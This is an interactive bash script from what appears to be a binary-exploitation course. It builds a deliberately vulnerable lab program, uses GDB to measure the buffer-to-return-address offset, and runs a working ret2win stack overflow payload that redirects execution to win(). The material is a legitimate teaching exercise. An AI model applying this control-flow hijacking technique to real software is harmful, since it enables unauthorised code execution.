#!/usr/bin/env bash
#
# Interactive solution for exercise 3 (ret2win).
# - Builds ./bin/ex3 (ensuring bin/ exists and is writable)
# - Crafts payload: 'A' * offset + p64(win)

set -euo pipefail

# Work from the script's folder so paths are stable.
DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
cd "$DIR"

echo "=== Exercise 3: Escaping the Matrix (ret2win) ==="
echo "We'll hijack control flow by overwriting the saved return address with win()."
echo "First we measure the byte distance: &buffer  →  (saved RET). Then we craft:"
echo "    payload = b'A' * offset + little_endian(win_addr)"
echo

# Ensure ./bin exists and you own it (fixes earlier 'Permission denied' issue).
mkdir -p ./bin
if [ ! -w ./bin ]; then
  echo "[fix] ./bin not writable; attempting to chmod/chown (you may need sudo)..."
  chmod u+rwx ./bin 2>/dev/null || true
fi

read -rp "Press ENTER to build ex3..."
make ex3

echo
read -rp "Press ENTER to launch GDB and compute buffer → RET offset..."

TMP="$(mktemp)"

# NOTE:
# - nexti 2 steps past the prologue (push rbp; mov rbp,rsp) so frame exists.
gdb -q \
  -ex 'file ./bin/ex3' \
  -ex 'break main' \
  -ex 'run' \
  -ex 'frame 0' \
  -ex 'nexti 2' \
  -ex 'printf "BUF=%p\n", &buffer' \
  -ex 'printf "RET=%p\n", (void*)($rbp+8)' \
  -ex 'printf "WIN=%p\n", win' \
  -ex 'quit' \
  2>&1 | tee "$TMP"

# Parse only our tagged lines; ignore all pwndbg noise.
buf_hex="$(grep '^BUF=' "$TMP" | head -n1 | cut -d= -f2)"
ret_hex="$(grep '^RET=' "$TMP" | head -n1 | cut -d= -f2)"
win_hex="$(grep '^WIN=' "$TMP" | head -n1 | cut -d= -f2)"

if [[ -z "${buf_hex:-}" || -z "${ret_hex:-}" || -z "${win_hex:-}" ]]; then
  echo "[!] Failed to parse addresses from GDB output. Dumping first 80 lines:"
  sed -n '1,80p' "$TMP"
  rm -f "$TMP"
  exit 1
fi

# Compute offset safely in Python to avoid bash arithmetic issues.
OFFSET="$(python3 -c "buf=int('$buf_hex',0); ret=int('$ret_hex',0); print(ret-buf)")"

echo
echo "[INFO] &buffer   = $buf_hex"
echo "[INFO] Saved RET = $ret_hex"
echo "[INFO] win()     = $win_hex"
echo "[INFO] Buffer → RET distance (bytes) = $OFFSET"
echo

read -rp "Press ENTER to run the exploit (padding + win())..."

# Build payload: 'A'*OFFSET + little-endian(win)
python3 -c "import sys; off=$OFFSET; win=int('$win_hex',0); sys.stdout.buffer.write(b'A'*off + win.to_bytes(8,'little'))" | ./bin/ex3

echo
echo "If you saw the win() success output, the ret2win worked."


